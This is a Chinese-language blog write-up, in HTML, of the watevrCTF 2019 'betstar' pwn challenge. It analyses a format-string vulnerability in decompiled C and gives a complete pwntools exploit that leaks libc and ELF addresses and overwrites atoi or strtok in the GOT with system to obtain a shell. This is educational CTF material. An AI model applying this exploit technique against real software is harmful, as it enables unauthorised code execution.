@@ -1,0 +1,333 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>nightmare 3.4.watevrctf2019-betstar-wp | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="相关资源  
+文件分析123456$ checksec betstar    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      P">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="nightmare 3.4.watevrctf2019-betstar-wp"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												nightmare 3.4.watevrctf2019-betstar-wp
+									
+									
+								</h1>
+								
+									<p id="/2023/08/25/watevrctf2019-betstar-wp/" class="leancloud-visitors view"
+										data-flag-title="nightmare 3.4.watevrctf2019-betstar-wp">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings/watevrctf19_betstar">相关资源</a>  </p>
+<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec betstar</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Welcome to the ultimate betting service.&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Enter the amount of players: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">3</span>, <span class="built_in">stdin</span>);</span><br><span class="line">num = atoi(s);</span><br><span class="line">players = (person *)<span class="built_in">malloc</span>(<span class="number">8</span> * (num + <span class="number">6</span>));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; ++i) &#123;		<span class="comment">// 创建num个玩家</span></span><br><span class="line">    v4 = &amp;players[i];</span><br><span class="line">    v4-&gt;name = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">4u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Name: &quot;</span>);</span><br><span class="line">    fgets(players[i].name, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    strtok(players[i].name, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="keyword">switch</span> (option) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:		<span class="comment">// 进行一局猜数</span></span><br><span class="line">    play_round(players);	</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:		<span class="comment">//展示各玩家得分</span></span><br><span class="line">    show_score(players, num);	</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:		<span class="comment">// 增添玩家</span></span><br><span class="line">    <span class="keyword">if</span> (v9 == <span class="number">6</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Ughh, stop it. I already added enought players for you. Stop &quot;</span></span><br><span class="line">             <span class="string">&quot;bothering me&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Welcome new player!&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Please enter your name: &quot;</span>);</span><br><span class="line">        v5 = &amp;players[num];</span><br><span class="line">        v5-&gt;name = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">4u</span>);</span><br><span class="line">        fgets(players[num].name, <span class="number">20</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        strtok(players[num++].name, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        ++v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:		<span class="comment">// 更改玩家名</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Which player index should i change: &quot;</span>);</span><br><span class="line">    fgets(nptr, <span class="number">5</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    v14 = atoi(nptr);</span><br><span class="line">    <span class="keyword">if</span> (v14 &gt;= <span class="number">0</span> &amp;&amp; v14 &lt;= num) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter new name: &quot;</span>);</span><br><span class="line">        fgets(players[v14].name, <span class="number">18</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        strtok(players[v14].name, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="play-round函数"><a href="#play-round函数" class="headerlink" title="play_round函数"></a>play_round函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Amount of players playing this round: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">5</span>, <span class="built_in">stdin</span>);		<span class="comment">// 指定前n个玩家参与游戏</span></span><br><span class="line">v6 = atoi(s);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Each player makes a bet between 0 -&gt; 100, the one who lands closest win &quot;</span></span><br><span class="line">     <span class="string">&quot;the round!&quot;</span>);</span><br><span class="line">v8 = rand() % <span class="number">100</span> + <span class="number">1</span>;</span><br><span class="line">v3 = <span class="number">-1</span>;</span><br><span class="line">v4 = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v6; ++i) &#123;	</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, players[i].name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;s bet: &quot;</span>);</span><br><span class="line">    v1 = fgets(v10, <span class="number">5</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    v7 = atoi(v1);</span><br><span class="line">    <span class="keyword">if</span> (v4 &gt; (<span class="type">int</span>)abs32(v8 - v7)) &#123;</span><br><span class="line">        v3 = i;</span><br><span class="line">        v4 = v7;</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, players[i].name);	<span class="comment">// 猜数离生成的随机数最近的玩家胜出，名存于dest</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;And the winner is *drumroll*: &quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(dest);	<span class="comment">// *********此处存在格式化字符串漏洞*********</span></span><br><span class="line">++players[v3].score;</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><ol>
+<li>创建多名玩家，构造首位玩家名进行游戏泄露地址</li>
+<li>准备将<code>system</code>真实地址写入到<code>strtok@got</code>中，这样覆盖之后再有调用处理输入<code>/bin/sh</code>即可获取shell</li>
+<li>由于<code>system</code>真实地址和<code>strtok</code>真实地址都是<code>0x7f</code>开头的，所以只需要覆盖最低三个字节（通过<code>%hhn</code>写入单字节，<code>%hn</code>写入双字节）</li>
+<li>拆分<code>system</code>地址的每个byte并计算相隔差距</li>
+<li>改名，此处要注意不能直接改相邻玩家，因为输入超过了分配的内存空间，会造成后面的被覆盖，所以可以改玩家0，2，4的名称</li>
+<li>多名玩家一起多进行几把猜数游戏，前面构造的三个玩家在某次胜利后就会写入目标地址（注意一定要都改完名再进行游戏，如果改一个进行一次可能导致strtok地址不可用，程序崩溃）</li>
+</ol>
+<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><ol>
+<li>此处更改<code>atoi</code>真实地址</li>
+<li>同样计算偏移量，构造格式化字符串（写入两次双字节）</li>
+<li>这次直接将字符串拆成两部分分别改玩家0和玩家1，改玩家1的时候覆盖玩家0名字末尾的终止符，成为一个字符串</li>
+<li>只要玩家0玩一次即可</li>
+</ol>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./betstar&quot;</span>, stdin=pty, stdout=pty)</span><br><span class="line">belf = ELF(<span class="string">&quot;./betstar&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_round</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;End the game&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Amount&#x27;</span>, <span class="built_in">str</span>(num).encode())</span><br><span class="line">    <span class="comment"># ts = []</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        t = randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;bet:&#x27;</span>, <span class="built_in">str</span>(t).encode())</span><br><span class="line">        <span class="comment"># ts.append(t)</span></span><br><span class="line">    <span class="comment"># info(ts)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">idx, name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;End the game&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;change: &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_player</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;End the game&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_offset</span>(<span class="params">bt</span>):</span><br><span class="line">    <span class="keyword">return</span> (bt - <span class="number">4</span> + <span class="number">0x100</span>) % <span class="number">0x100</span>		<span class="comment"># 可能被减为负，需要加上然后区域</span></span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    pie b 0x000009DF</span></span><br><span class="line"><span class="string">    pie b 0x00000D71</span></span><br><span class="line"><span class="string">    pie b 0x00000E47</span></span><br><span class="line"><span class="string">    pie b 0x000009A7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;amount&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Name:&#x27;</span>, <span class="string">b&#x27;%1$p%23$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">play_round(<span class="number">1</span>)		<span class="comment"># 只第一名玩家玩，泄露ELF和libc基地址（由gdb调试分析得来1$p和23$p）</span></span><br><span class="line">ru(<span class="string">b&#x27;*drumroll*: &#x27;</span>)</span><br><span class="line">belf_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;05c&#x27;</span>), <span class="number">16</span>) - <span class="number">0x105c</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>).strip(<span class="string">b&#x27;\n&#x27;</span>), <span class="number">16</span>) - <span class="number">0x10</span> -libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">strtok = libc_base + libc.sym[<span class="string">&#x27;strtok&#x27;</span>]</span><br><span class="line">strtok_got = belf_base + belf.got[<span class="string">&#x27;strtok&#x27;</span>]</span><br><span class="line">atoi_got = belf_base + belf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;elf base: &quot;</span> + <span class="built_in">hex</span>(belf_base))</span><br><span class="line">success(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;strtok: &quot;</span> + <span class="built_in">hex</span>(strtok))</span><br><span class="line">success(<span class="string">&quot;strtok@got: &quot;</span> + <span class="built_in">hex</span>(strtok_got))</span><br><span class="line">success(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">byte0 = (system &amp; <span class="number">0xff</span>)</span><br><span class="line">byte1 = ((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">byte2 = ((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">word1 = ((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xffff</span>)    <span class="comment"># byte 1 and 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # method 1</span></span><br><span class="line"><span class="comment"># change_name(0, p32(strtok_got + 0) + f&#x27;%&#123;get_offset(byte0)&#125;d%19$hhn&#x27;.encode())</span></span><br><span class="line"><span class="comment"># info(&quot;player0: &quot;+ f&#x27;%&#123;get_offset(byte0)&#125;d%19$hhn&#x27;)</span></span><br><span class="line"><span class="comment"># change_name(2, p32(strtok_got + 1) + f&#x27;%&#123;get_offset(byte1)&#125;d%19$hhn&#x27;.encode())</span></span><br><span class="line"><span class="comment"># info(&quot;player1: &quot;+ f&#x27;%&#123;get_offset(byte1)&#125;d%19$hhn&#x27;)</span></span><br><span class="line"><span class="comment"># change_name(4, p32(strtok_got + 2) + f&#x27;%&#123;get_offset(byte2)&#125;d%19$hhn&#x27;.encode())</span></span><br><span class="line"><span class="comment"># info(&quot;player2: &quot;+ f&#x27;%&#123;get_offset(byte2)&#125;d%19$hhn&#x27;)</span></span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     play_round(6)</span></span><br><span class="line"><span class="comment"># add_player(b&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># method 2</span></span><br><span class="line">fmt = p32(atoi_got) + p32(atoi_got + <span class="number">2</span>)</span><br><span class="line">fmt += <span class="string">f&#x27;%<span class="subst">&#123;(system &amp; <span class="number">0xffff</span>) - <span class="number">8</span>&#125;</span>d%19$hn&#x27;</span>.encode()</span><br><span class="line">fmt += <span class="string">f&#x27;%<span class="subst">&#123;((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (system &amp; <span class="number">0xffff</span>)&#125;</span>d%20$hn&#x27;</span>.encode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(fmt))</span><br><span class="line">change_name(<span class="number">0</span>, fmt[<span class="number">0</span>:<span class="number">17</span>])</span><br><span class="line">change_name(<span class="number">1</span>, fmt[<span class="number">16</span>:])</span><br><span class="line">play_round(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;End the game&#x27;</span>, <span class="string">b&#x27;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/08/25/watevrctf2019-betstar-wp/" class="leancloud-visitors view" data-flag-title="nightmare 3.4.watevrctf2019-betstar-wp">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/08/28/CISCN2019-华北Day2-wp/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/08/24/Backdoorctf2017-bbpwn-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-08-25 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pwn-wp/">pwn-wp<span>12</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>57</span></a></li> <li><a href="/tags/pwn/">pwn<span>17</span></a></li> <li><a href="/tags/stack/">stack<span>8</span></a></li> <li><a href="/tags/nightmare/">nightmare<span>6</span></a></li> <li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li> <li><a href="/tags/got/">got<span>2</span></a></li> <li><a href="/tags/watevrctf2019/">watevrctf2019<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
